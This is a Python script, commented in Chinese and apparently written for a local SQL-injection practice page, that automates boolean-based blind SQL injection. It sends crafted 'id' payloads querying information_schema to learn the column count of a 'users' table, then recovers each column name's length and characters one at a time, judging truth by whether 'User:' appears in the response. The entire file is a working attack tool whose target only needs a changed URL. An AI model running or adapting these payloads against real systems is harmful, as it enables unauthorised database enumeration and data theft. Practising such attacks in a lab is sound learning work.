"""
字段名布尔盲注爆破脚本
适用环境：本地 SQL-Injection.php 测试页面，表名为 users
判断依据：页面返回内容包含 "User:" 表示条件为真
"""

import string
import requests
import sys

# 配置
TARGET_URL = "http://localhost/SQL-Injection.php"
TIMEOUT = 5
TABLE_NAME = "users"          # 要爆破的表名
MAX_COLUMNS = 20               # 最大字段数
MAX_NAME_LENGTH = 30           # 字段名最大长度

# 字符集：数字、大小写字母、下划线
CHARSET = string.digits + string.ascii_letters + '_'

def make_request(payload):
    """发送请求并返回响应文本，异常时返回 None"""
    try:
        params = {'id': payload}
        resp = requests.get(TARGET_URL, params=params, timeout=TIMEOUT)
        return resp.text
    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return None

def is_true(html):
    """判断页面是否为真（存在 User: 表示有数据返回）"""
    return html is not None and "User:" in html

def get_column_count():
    """爆破指定表中的字段数量"""
    print("[*] 正在爆破字段数量...")
    for count in range(1, MAX_COLUMNS + 1):
        # 构造 payload: 1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') = 计数 -- -
        payload = f"1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='{TABLE_NAME}') = {count} -- -"
        html = make_request(payload)
        if is_true(html):
            print(f"[+] 字段数量: {count}")
            return count
    print("[-] 未找到字段数量（可能超过 MAX_COLUMNS 或表名错误）")
    sys.exit(1)

def get_column_name_length(col_index):
    """爆破第 col_index 个字段的长度（索引从0开始）"""
    for length in range(1, MAX_NAME_LENGTH + 1):
        # 构造 payload: 1' and length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 索引,1)) = 长度 -- -
        payload = f"1' and length((select column_name from information_schema.columns where table_schema=database() and table_name='{TABLE_NAME}' limit {col_index},1)) = {length} -- -"
        html = make_request(payload)
        if is_true(html):
            return length
    return 0  # 没找到返回0

def get_column_name(col_index, length):
    """逐字符爆破第 col_index 个字段的字段名"""
    col_name = ""
    for pos in range(1, length + 1):
        found = False
        for ch in CHARSET:
            # 构造 payload: 1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 索引,1), 位置,1) = '字符' -- -
            payload = f"1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name='{TABLE_NAME}' limit {col_index},1), {pos},1) = '{ch}' -- -"
            html = make_request(payload)
            if is_true(html):
                col_name += ch
                print(f"[+] 字段[{col_index}] 第 {pos} 位: {ch}")
                found = True
                break
        if not found:
            print(f"[-] 字段[{col_index}] 第 {pos} 位未匹配到字符，置为 '?'")
            col_name += '?'
    return col_name

def main():
    print("=" * 60)
    print("SQL 注入布尔盲注 - 字段名爆破")
    print(f"目标表: {TABLE_NAME}")
    print("=" * 60)

    # 1. 获取字段数量
    col_count = get_column_count()

    # 2. 遍历每个字段，爆破字段名
    column_names = []
    for idx in range(col_count):
        print(f"\n[*] 正在爆破第 {idx} 个字段...")
        length = get_column_name_length(idx)
        if length == 0:
            print(f"[-] 字段[{idx}] 长度获取失败，跳过")
            column_names.append("?")
            continue
        print(f"[+] 字段[{idx}] 长度: {length}")
        name = get_column_name(idx, length)
        column_names.append(name)
        print(f"[+] 字段[{idx}] 名称: {name}")

    # 3. 输出所有字段名
    print("\n" + "=" * 60)
    print("最终结果（所有字段名）:")
    for idx, name in enumerate(column_names):
        print(f"字段[{idx}]: {name}")
    print("=" * 60)

if __name__ == "__main__":
    main()